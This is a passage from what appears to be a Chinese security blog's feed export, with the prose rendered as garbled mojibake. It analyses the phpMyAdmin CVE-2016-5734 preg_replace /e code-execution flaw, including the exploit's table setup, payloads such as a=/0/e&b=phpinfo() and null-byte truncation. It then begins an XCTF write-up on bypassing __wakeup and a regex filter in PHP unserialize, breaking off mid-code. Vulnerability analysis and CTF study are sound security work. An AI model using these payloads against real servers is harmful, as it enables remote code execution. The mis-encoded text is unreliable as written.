payloadå°±éœ€è¦å¯¹findã€replaceWithã€row[0]ä¸‰ä¸ªå‚æ•°è¿›è¡Œæº¯æºåˆ†æï¼Œæœç´¢_getRegexReplaceRows()å‡½æ•°ï¼Œåœ¨ç¬¬1430è¡Œå‘ç°åœ¨getReplacePreview()å‡½æ•°å†…éƒ¨è¿›è¡Œäº†è°ƒç”¨ï¼Œä¾ç„¶åªæ˜¯å•çº¯çš„ä¼ å‚ï¼Œç»§ç»­æº¯æºgetReplacePreview()å‡½æ•°<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/04/1601830883.png" alt="image12.png"></p><p>åœ¨tbl_find_replace.phpæ–‡ä»¶ä¸­å‘ç°è°ƒç”¨äº†getReplacePreview()å‡½æ•°ï¼Œä¸”ä½¿ç”¨POSTæ–¹å¼æ¥å—å››ä¸ªå‚æ•°ï¼ŒåŒ…æ‹¬å‰è¾¹preg_replace()å‡½æ•°çš„findå’Œreplaceä¸¤ä¸ªå‚æ•°ï¼Œå³ç¬¬1ã€2å‚æ•°<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/04/1601830889.png" alt="image13.png"></p><p>æ­¤æ—¶å·²çŸ¥preg_replaceçš„å‰ä¸¤ä¸ªå‚æ•°å¯æ§ï¼Œä½†æ˜¯è¦æ‰§è¡Œå‘½ä»¤çš„æ¡ä»¶æ˜¯éœ€è¦åœ¨ç¬¬ä¸‰ä¸ªå‚æ•°ä¸­åŒ¹é…åˆ°ç¬¬ä¸€ä¸ªå‚æ•°çš„å†…å®¹ï¼Œæ‰€ä»¥è¿˜éœ€è¦å¯¹ç¬¬ä¸‰ä¸ªå‚æ•°è¿›è¡Œæº¯æº</p><p>å›åˆ°/libraries/TableSearch.class.phpæ–‡ä»¶çš„_getRegexReplaceRows()å‡½æ•°å¤„ï¼Œpreg_replace()å‡½æ•°ç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯row[0]ï¼Œè¡¨ç¤ºè¯¥å‚æ•°æ˜¯æ•°æ®åº“æŸ¥æ‰¾ç»“æœresultçš„ç¬¬ä¸€è¡Œï¼Œä¸Šè¾¹ä¹Ÿå†™å‡ºäº†æ‹¼æ¥çš„æŸ¥è¯¢è¯­å¥<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/04/1601830927.png" alt="image14.png"></p><p>å…¶ä¸­PMA_Utilç±»åœ¨/libraries/Util.class.phpç±»æ–‡ä»¶ä¸­è¿›è¡Œäº†å®šä¹‰ï¼Œå…¶å†…éƒ¨æ–¹æ³•åŸºæœ¬å°±æ˜¯å¯¹åŸå§‹æ•°æ®åšå®‰å…¨å¤„ç†ï¼Œå¦‚æ•æ„Ÿå­—ç¬¦çš„æ›¿æ¢ã€ç¼–ç ã€åˆ é™¤ç­‰æ“ä½œï¼Œæˆªå–å…¶ä¸­çš„ä¸€ä¸ªsqlAddSlashes()å‡½æ•°ä½œä¸ºç¤ºä¾‹ï¼š<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/04/1601830943.png" alt="image15.png"></p><p>ç”±äºè¦æ„é€ payloadçš„åœ°æ–¹å¹¶ä¸æ˜¯SQLæŸ¥è¯¢å‚æ•°å¤„ï¼Œæ‰€ä»¥PMA_Utilç±»çš„è¿‡æ»¤æ“ä½œå¯ä»¥ç•¥è¿‡ï¼Œå› æ­¤è¯¥SQLæŸ¥è¯¢è¯­å¥å¯ä»¥ç†è§£ä¸ºï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> $columnname ,<span class="number">1</span>,cont(<span class="operator">*</span>) <span class="keyword">FROM</span> database.table_name <span class="keyword">WHERE</span> $columnname RLIKE â€˜$findâ€™ <span class="keyword">COLLATE</span> $charset_bin <span class="keyword">GROUP</span> <span class="keyword">BY</span> $columnname <span class="keyword">ORDER</span> <span class="keyword">BY</span> $<span class="keyword">column</span> <span class="keyword">ASC</span>;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­æœ‰ä¸¤ä¸ªæŸ¥è¯¢å‚æ•°ï¼š$this-&gt;_dbã€$this-&gt;_tableæ˜¯å½“å‰ç±»çš„ä¸¤ä¸ªæˆå‘˜å˜é‡ï¼š<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/04/1601830965.png" alt="image16.png"></p><p>å¯¹å…¶æº¯æºï¼Œæœ€ç»ˆåœ¨å½“å‰ç±»çš„æ„é€ å‡½æ•°__construct()ä¸­å‘ç°äº†å®šä¹‰ï¼Œæ˜¯åˆå§‹åŒ–æ—¶æ¥æ”¶çš„å‚æ•°ï¼Œæ‰€ä»¥å°±éœ€è¦ç»§ç»­å¯¹å½“å‰ç±»çš„å®ä¾‹åŒ–è¿›è¡Œæº¯æºï¼Œæ‰¾åˆ°ä¼ å…¥çš„å‚æ•°<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/04/1601830977.png" alt="image17.png"></p><p>å·²çŸ¥å½“å‰ç±»æ˜¯PMA_TableSearch<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/04/1601830984.png" alt="image18.png"></p><p>å¯¹å½“å‰ç±»çš„å®ä¾‹åŒ–è¿›è¡Œæº¯æºï¼Œæœ€ç»ˆåœ¨æ¼æ´å‘ç”Ÿå¤„ï¼Œå³tbl_find_replace.phpæ–‡ä»¶ä¸­å‘ç°äº†å¼•ç”¨ï¼Œä½†æ˜¯ä¾ç„¶æ˜¯ç›´æ¥ä¼ å…¥å‚æ•°ï¼š$db, $tableï¼Œå› æ­¤éœ€è¦å¯¹è¿™ä¸¤ä¸ªå‚æ•°ç»§ç»­æº¯æº<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/04/1601830996.png" alt="image19.png"></p><p>å‘ç°ä¸Šå›¾ä¸­ï¼Œtbl_find_replace.phpæ–‡ä»¶é™¤äº†åŒ…å«libraries/TableSearch.class.phpæ–‡ä»¶å¤–ï¼Œè¿˜åŒ…å«äº†libraries/common.inc.phpæ–‡ä»¶ï¼Œå› æ­¤ç›´æ¥åœ¨libraries/common.inc.phpæ–‡ä»¶ä¸­æœç´¢å®šä¹‰çš„å…¨å±€å˜é‡ï¼Œæœ€ç»ˆåœ¨ç¬¬525å’Œ531è¡Œæ‰¾åˆ°<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/04/1601831011.png" alt="image20.png"></p><p>è€Œä¸”åœ¨ä¸‹é¢çš„ä»£ç ä¸­å‘ç°ï¼Œdbå’Œtableæ˜¯é€šè¿‡REQUESTæ–¹å¼ä»è¡¨å•æ¥æ”¶æ¥çš„ï¼Œå…¶ä¸­dbæ˜¯æ•°æ®åº“åï¼Œtableæ˜¯è¡¨åï¼Œç„¶åå¯¹å…¶è¿›è¡ŒæŸ¥è¯¢æ“ä½œã€‚</p><p>è‡³æ­¤ï¼Œæ•°æ®æº¯æºå®Œæ¯•ï¼Œæ•´ä½“é“¾å¦‚ä¸‹ï¼š</p><ul><li>REQUESTæ¥æ”¶æ•°æ®åº“ådbå’Œè¡¨åtableï¼Œå¯¹å…¶è¿›è¡ŒæŸ¥è¯¢æ“ä½œï¼›</li><li>å°†æŸ¥è¯¢ç»“æœç¬¬ä¸€è¡Œçš„å€¼row[0]èµ‹å€¼ç»™preg_replace()å‡½æ•°ç¬¬ä¸‰ä¸ªå‚æ•°ï¼›</li><li>é€šè¿‡POSTæ–¹å¼æ¥æ”¶findå’ŒreplaceWithå‚æ•°ï¼Œåˆ†åˆ«èµ‹å€¼ç»™preg_replace()çš„ç¬¬ä¸€ã€äºŒä¸ªå‚æ•°ï¼›</li><li>ç”±äºç¬¬ä¸€äºŒä¸ªå‚æ•°å¯æ§ï¼Œå› æ­¤åªè¦è®©æ•°æ®åº“æŸ¥è¯¢ç»“æœçš„ç¬¬ä¸€è¡Œä¸­æ˜¯å·²çŸ¥çš„ï¼ˆå› ä¸ºè¦åŒ¹é…åˆ°æ‰èƒ½è§¦å‘/eæ‰§è¡Œphpè¯­å¥ï¼‰ï¼Œæˆ–æ˜¯å¯æ§çš„ï¼Œå³å¯æ„é€ payloadè¿›è¡Œä»£ç æ‰§è¡Œï¼Œç”šè‡³RCEã€‚</li></ul><p>è¯¥æ–‡ä»¶æœ¬æ¥æƒ³è¦å®ç°çš„åŠŸèƒ½åº”è¯¥æ˜¯replaceå³ä¿®æ”¹æ“ä½œï¼Œä½†æ˜¯å¿½ç•¥äº†preg_replace()å‡½æ•°çš„/eæ¨¡å¼ï¼Œä¸”å‚æ•°å¯æ§ï¼Œæœªåšå®‰å…¨æ ¡éªŒã€‚</p><h2 id="0x02-POC-EXPåˆ†æ"><a href="#0x02-POC-EXPåˆ†æ" class="headerlink" title="0x02 POC/EXPåˆ†æ"></a>0x02 POC/EXPåˆ†æ</h2><p>å·²çŸ¥åŸç†ï¼Œç°åœ¨åˆ†æä¸€ä¸‹kaliä¸­ç»™å‡ºçš„POCï¼Œå…¶å®å·²ç»æ˜¯EXPäº†ï¼Œå› ä¸ºå¯ä»¥ç›´æ¥æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚</p><p>é¦–å…ˆåˆ¤æ–­æ˜¯å¦æŒ‡å®šæ•°æ®åº“ï¼Œæ²¡æœ‰æŒ‡å®šçš„è¯å°±é»˜è®¤é€‰æ‹©teståº“ï¼Œç„¶ååˆ›å»ºprgpwnè¡¨ï¼Œå†åˆ›å»ºä¸€ä¸ªfirstå­—æ®µï¼Œå¹¶å†™å…¥å†…å®¹<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/04/1601831065.png" alt="image21.png"></p><p>å†™å…¥çš„å†…å®¹æ˜¯ç»è¿‡UNHEX()16è¿›åˆ¶è½¬å­—ç¬¦ä¸²åçš„å†…å®¹ï¼š<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/04/1601831070.png" alt="image22.png"></p><p>å¯ä»¥åœ¨æ•°æ®åº“ä¸­æŸ¥çœ‹EXPæ‰§è¡Œç»“æœï¼ŒæˆåŠŸåˆ›å»ºç›¸å…³å†…å®¹ï¼š<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/04/1601831075.png" alt="image23.png"></p><p>å®Œæˆåï¼Œå†å¯¹findå’ŒreplaceWithå‚æ•°è¿›è¡Œå¯æ§èµ‹å€¼ï¼Œfindä¼ å…¥0/e\0ï¼Œ\0ç”¨äºæˆªæ–­æºç ä¸­findåè¾¹çš„åæ–œæ ï¼ŒreplaceWithå°±å¯ä»¥ä¼ å…¥payloadäº†ï¼Œå³è¦æ‰§è¡Œçš„phpä»£ç <br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/04/1601831080.png" alt="image24.png"></p><p>æ­¤æ—¶å› ä¸ºdbå’ŒtableæŒ‡å®šçš„æŸ¥è¯¢ç»“æœå°±æ˜¯åˆšæ‰å†™å…¥çš„å†…å®¹ï¼Œå†ä¸ä¼ å…¥çš„findæˆåŠŸåŒ¹é…ï¼ŒåŠ ä¸Š/eæ¨¡å¼ï¼Œæ‰€ä»¥å¯ä»¥å°†replaceWithå†…å®¹ä½œä¸ºphpä»£ç æ‰§è¡Œï¼Œå½“ä¼ å…¥æ‰§è¡Œçš„phpä»£ç ä¸º system()å‡½æ•°æ—¶ï¼Œå³å¯è¿›è¡ŒRCEã€‚</p><h2 id="0x03-preg-replace-å‡½æ•°åˆ†æ"><a href="#0x03-preg-replace-å‡½æ•°åˆ†æ" class="headerlink" title="0x03 preg_replace()å‡½æ•°åˆ†æ"></a>0x03 preg_replace()å‡½æ•°åˆ†æ</h2><p>preg_replace()å‡½æ•°ç”¨äºæ­£åˆ™æ›¿æ¢ï¼Œå½“æ¨¡å¼ä¸ºeæ—¶ä¼šå°†æ›¿æ¢çš„å­—ç¬¦ä¸²ä½œä¸ºphpä»£ç æ‰§è¡Œï¼Œå½“æˆ‘å¤ç°æ—¶å‘ç°ï¼Œpreg_replace()å‡½æ•°åœ¨php7ä¸­å·²ç»ä¸å†æ”¯æŒäº†ï¼Œä½¿ç”¨preg_replace_callback()å‡½æ•°ä½œä¸ºæ›¿ä»£æ–¹æ¡ˆ<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/04/1601831110.png" alt="image25.png"></p><p>è€Œä¸”åœ¨php5.5.38å’Œphp5.6ä¸­ä¹Ÿç»™å‡ºäº†æ›¿ä»£æç¤ºï¼Œä½†æ˜¯è¿˜å¯ä»¥æ­£å¸¸ä½¿ç”¨ï¼›åœ¨php5.4åŠä¹‹å‰çš„ç‰ˆæœ¬éƒ½æ˜¯å¯ä»¥çš„ï¼Œä¸”æ²¡æœ‰ä»»ä½•æç¤ºã€‚</p><p>ä¸ºäº†æ–¹ä¾¿æµ‹è¯•ï¼Œæœ¬åœ°ä½¿ç”¨php5.3.29ä½œä¸ºæµ‹è¯•ç¯å¢ƒï¼Œç¼–å†™ä»¥ä¸‹æµ‹è¯•ä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// $a = &quot;/&quot; . $_POST[&quot;a&quot;] . &quot;/&quot;;</span></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_POST</span>[<span class="string">&quot;a&quot;</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_POST</span>[<span class="string">&quot;b&quot;</span>];</span><br><span class="line"><span class="variable">$c</span> = <span class="variable">$_POST</span>[<span class="string">&quot;c&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;a : &quot;</span> . <span class="variable">$a</span>;</span><br><span class="line">var_dump(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt; b : &quot;</span> . <span class="variable">$b</span>;</span><br><span class="line">var_dump(<span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt; c : &quot;</span> . <span class="variable">$c</span>;</span><br><span class="line">var_dump(<span class="variable">$c</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$a</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$b</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$c</span>))&#123;</span><br><span class="line">preg_replace(<span class="variable">$a</span>, <span class="variable">$b</span>, <span class="variable">$c</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt; ERROR: Please Input Message&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç®€å•å®ç°äº†ä¸€ä¸ªPOSTä¼ å…¥ä¸‰ä¸ªå‚æ•°aã€bã€cï¼Œå°†å…¶ä¼ å…¥preg_replace()å‡½æ•°è¿›è¡Œæ­£åˆ™æ›¿ä»£ã€‚</p><p>é¦–å…ˆä¼ å…¥æ­£å¸¸çš„æ•°æ®ï¼ša=/[1-9]/&amp;b=O&amp;c=a1b2c3d4<br>ä½œç”¨æ˜¯åœ¨å°†cä¸­æ‰€æœ‰çš„1-9çš„æ•°å­—æ›¿æ¢ä¸ºO<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/04/1601831146.png" alt="image26.png"></p><p>ä½¿ç”¨/eå‘½ä»¤æ‰§è¡Œæ¨¡å¼ï¼Œä¼ å…¥ä»¥ä¸‹æ•°æ®ï¼ša=/0/e&amp;b=phpinfo()&amp;c=/0/e<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/04/1601831159.png" alt="image27.png"></p><p>ä¹Ÿå¯ä»¥ä¼ å…¥ä»¥ä¸‹å‚æ•°ï¼š**<code>a=/(.)/e&amp;b=phpinfo()&amp;c=everything</code><strong>ï¼Œå…¶ä¸­</strong><code>/(.)/</code>**è¡¨ç¤ºåŒ¹é…ç¬¬ä¸€ä¸ªå­—ç¬¦ï¼Œæ‰€ä»¥å¾…åŒ¹é…çš„å­—ç¬¦ä¸²æ˜¯ä»»ä½•æ•°æ®éƒ½è¡Œã€‚</p><p>ä¹Ÿå¯ä»¥ä¼ å…¥ä»¥ä¸‹å‚æ•°ï¼š**<code>a=/(.*)/e&amp;b=phpinfo()&amp;c=everything</code><strong>ï¼Œå…¶ä¸­</strong><code>/(.*)/</code>**è¡¨ç¤ºåŒ¹é…æ‰€æœ‰ï¼Œæ‰€ä»¥å¾…åŒ¹é…çš„å­—ç¬¦ä¸²æ˜¯ä»»ä½•æ•°æ®éƒ½è¡Œã€‚</p><p>ä¹Ÿå¯ä»¥ä¼ å…¥ä»¥ä¸‹å‚æ•°ï¼š**<code>a=/(.*)/e&amp;b=\1&amp;c=phpinfo()</code><strong>ï¼Œå…¶ä¸­</strong><code>/(.*)/</code><strong>è¡¨ç¤ºåŒ¹é…æ‰€æœ‰å­—ç¬¦ï¼Œè€Œ\1è¡¨ç¤ºå…¶æœ¬èº«ï¼Œä¹Ÿå°±æ˜¯è¦æ‰§è¡Œçš„phpä»£ç å°±æ˜¯</strong><code>/(.*)/</code>**åŒ¹é…çš„ç»“æœï¼Œå³å¾…åŒ¹é…å­—ç¬¦ä¸²çš„å…¨éƒ¨ï¼šphpinfo()<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/04/1601831170.png" alt="image28.png"></p><p>å½“ä¼ å…¥systemå‡½æ•°æ—¶ï¼Œå°±å¯ä»¥RCEäº†ã€‚</p><p>æœ€åï¼Œè¿˜æœ‰ä¸€ä¸ªæˆªæ–­çš„é—®é¢˜ï¼Œåœ¨EXPä¸­ç”¨çš„æ˜¯**<code>\0</code><strong>æˆªæ–­ï¼Œä½†æ˜¯åœ¨æˆ‘æµ‹è¯•ä¸­å‘ç°ï¼Œå•çº¯çš„</strong><code>\0</code>**å¹¶ä¸èƒ½è¿›è¡Œæˆªæ–­ï¼Œå¾ˆå¥‡æ€ªï¼Œåè€Œæ˜¯%00å¯ä»¥åœ¨php5çš„è¾ƒä½ç‰ˆæœ¬ä¸­è¿›è¡Œæˆªæ–­ï¼Œå¹¶è§¦å‘å‘½ä»¤æ‰§è¡Œã€‚</p><p>å‚è€ƒæ¼æ´ä¸­çš„æƒ…å†µï¼Œæˆ‘ä»¬ç»™ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œå³aä¸¤è¾¹åŠ ä¸Š / ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="string">&quot;/&quot;</span> . <span class="variable">$_POST</span>[<span class="string">&quot;a&quot;</span>] . <span class="string">&quot;/&quot;</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_POST</span>[<span class="string">&quot;b&quot;</span>];</span><br><span class="line"><span class="variable">$c</span> = <span class="variable">$_POST</span>[<span class="string">&quot;c&quot;</span>];</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨çš„phpç‰ˆæœ¬æ˜¯ <strong>php5.3.26</strong>ï¼Œæ­¤æ—¶å¯ä»¥åˆ©ç”¨%00æˆªæ–­å¹¶è§¦å‘ä»£ç æ‰§è¡Œï¼š<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/06/1601957543.png" alt="2020-10-06_12-10-35.png"></p><p>php &lt; 5.3.4å­˜åœ¨%00æˆªæ–­æ˜¯å·²çŸ¥çš„ï¼Œä½†æ˜¯**<code>\0</code>**æ— æ³•æˆªæ–­æœªèƒ½ç†è§£ï¼Œå¸Œæœ›å“ªä½å¸ˆå‚…çŸ¥é“ç¼˜ç”±çš„å¯ä»¥å‘ŠçŸ¥æˆ‘ï¼Œæ„Ÿè°¢ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> æ¼æ´åˆ†æ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE-2016-5734 </tag>
            
            <tag> phpmyadminè¿œç¨‹ä»£ç æ‰§è¡Œ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€XCTFã€‘ Webè¿›é˜¶åŒº WriteUp æ±‡æ€»</title>
      <link href="post/20200972133.html"/>
      <url>post/20200972133.html</url>
      
        <content type="html"><![CDATA[<h2 id="â­-Web-php-unserializeï¼ˆ-wakeup-ç»•è¿‡-æ­£åˆ™åŒ¹é…ç»•è¿‡ï¼‰"><a href="#â­-Web-php-unserializeï¼ˆ-wakeup-ç»•è¿‡-æ­£åˆ™åŒ¹é…ç»•è¿‡ï¼‰" class="headerlink" title="â­ Web_php_unserializeï¼ˆ__wakeup()ç»•è¿‡+æ­£åˆ™åŒ¹é…ç»•è¿‡ï¼‰"></a>â­ Web_php_unserializeï¼ˆ__wakeup()ç»•è¿‡+æ­£åˆ™åŒ¹é…ç»•è¿‡ï¼‰</h2><p>ä¸€ä¸ªååºåˆ—åŒ–é¢˜ç›®ï¼Œé¡µé¢ç›´æ¥ç»™å‡ºäº†æºç ï¼š</p><pre><code><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123; </span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$file</span> = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = <span class="variable">$file</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file, <span class="literal">true</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;file != <span class="string">&#x27;index.php&#x27;</span>) &#123; </span><br><span class="line">            <span class="comment">//the secret is in the fl4g.php</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;file = <span class="string">&#x27;index.php&#x27;</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>])) &#123; </span><br><span class="line">    <span class="variable">$var</span> = base64_decode(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>]); </span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="variable">$var</span>)) &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;stop hacking!&#x27;</span>); </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        @unserialize(<span class="variable">$var</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    highlight_file(<span class="string">&quot;index.php&quot;</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></code></pre><p><strong>è¿›è¡Œç®€å•çš„å®¡è®¡</strong></p><p>å…ˆæ˜¯åˆ›å»ºäº†ä¸€ä¸ªDemoç±»ï¼Œç±»ä¸­å®šä¹‰ç§æœ‰å±æ€§$fileä¸ºæ–‡ä»¶åï¼Œå¹¶åˆå§‹åŒ–äº†ä¸‰ä¸ªé­”æœ¯æ–¹æ³•ï¼š</p><ul><li>__construct() æ„é€ å‡½æ•°åœ¨å®ä¾‹åŒ–ç±»æ—¶æ‰§è¡Œ</li><li>__destruct() ææ„å‡½æ•°åœ¨é”€æ¯å¯¹è±¡æ—¶æ‰§è¡Œ</li><li>__wakeup() åœ¨ååºåˆ—åŒ–å‰æ‰§è¡Œ</li></ul><p>å…¶ä¸­<code>__wakeup()</code>ä¸­ç»™å‡ºflagæ–‡ä»¶çš„æç¤ºï¼Œä½†æ˜¯å¦‚æœæ‰§è¡Œè¯¥å‡½æ•°ï¼Œåˆ™ä¼šå¼ºåˆ¶å°†åŒ…å«æ–‡ä»¶æ”¹ä¸ºindex.phpï¼Œå› æ­¤æ­¤å¤„æ˜¯ä¸€ä¸ªè¿‡æ»¤ç‚¹ï¼Œéœ€è¦ç»•è¿‡ã€‚<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/13/1602570893.png" alt="1602570853115.png"></p><p>ç»§ç»­å¾€ä¸‹ï¼Œä¸€ä¸ªif elseå­å¥è¯­å¥ï¼ŒGETæ¥æ”¶varå‚æ•°å¹¶è¿›è¡Œbase64è§£ç ï¼Œç„¶å<code>preg_match(&#39;/[oc]:\d+:/i&#39;, $var)</code>åšè¿‡æ»¤ï¼Œå…¶ä¸­æ­£åˆ™è¡¨è¾¾å¼çš„å«ä¹‰æ˜¯ï¼šåŒ¹é…<strong>o:ä»»æ„æ•°å­—</strong>æˆ–<strong>c:ä»»æ„æ•°å­—</strong>ï¼ŒåŒ¹é…åˆ°åˆ™ç»ˆæ­¢ç¨‹åºï¼Œå› æ­¤è¿™é‡Œä¹Ÿè®¸è¦ç»•è¿‡ã€‚<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/13/1602570808.png" alt="1602570787053.png"></p><p>æ€»å…±æœ‰ä¸¤ä¸ªè¿‡æ»¤ç‚¹éœ€è¦ç»•è¿‡ï¼Œå…ˆç¼–å†™ä»£ç å¯¹Demoç±»å®ä¾‹åŒ–å¯¹è±¡è¿›è¡Œåºåˆ—åŒ–ï¼Œå¾—åˆ°å¦‚ä¸‹ç»“æœï¼š </p><pre><code><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;Demo&quot;:1:&#123;s:10:&quot;\00Demo\00file&quot;;s:8:&quot;fl4g.php&quot;;&#125; </span><br></pre></td></tr></table></figure></code></pre><p>(\00ä¸ºæ‰‹åŠ¨æ·»åŠ ï¼Œå› ä¸ºæ˜¯ç§æœ‰å±æ€§ï¼Œä½†æ˜¯\00åœ¨é¡µé¢ä¸ä¼šæ˜¾ç¤ºï¼Œæ‰€ä»¥éœ€è¦æ‰‹åŠ¨æ·»åŠ )</p><p>ç»•è¿‡æ–¹æ³•ï¼š</p><ol><li>ç»•è¿‡æ‰§è¡Œ==__wakeup()==é­”æœ¯æ–¹æ³•ï¼Œæ ¹æ®ä¹‹å‰åšçš„é¢˜ç›®ï¼Œåªéœ€è¦å°†åºåˆ—åŒ–åçš„Jsonä¸²ä¸­çš„å±æ€§ä¸ªæ•°ä¿®æ”¹ä¸ºå¤§äºçœŸå®å±æ€§ä¸ªæ•°å³å¯ç»•è¿‡æ‰§è¡Œè¯¥é­”æœ¯æ–¹æ³•</li><li>ç»•è¿‡<code>preg_match(&#39;/[oc]:\d+:/i&#39;, $var)</code>å¯¹åºåˆ—åŒ–çš„åŒ¹é…ï¼Œå°†O:4æ”¹ä¸ºO:+4å³å¯ï¼Œå› ä¸º+4ç­‰åŒäº4</li></ol><p>æ‰€ä»¥ï¼Œåœ¨æºç çš„åŸºç¡€ä¸Šï¼Œæ·»åŠ åºåˆ—åŒ–ä»¥åŠå­—ç¬¦æ›¿æ¢çš„ä»£ç ï¼Œå¹¶ç›´æ¥è¾“å‡ºbase64ç¼–ç åçš„åºåˆ—åŒ–ç»“æœï¼Œä»£ç å¦‚ä¸‹ï¼š</p><pre><code><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span 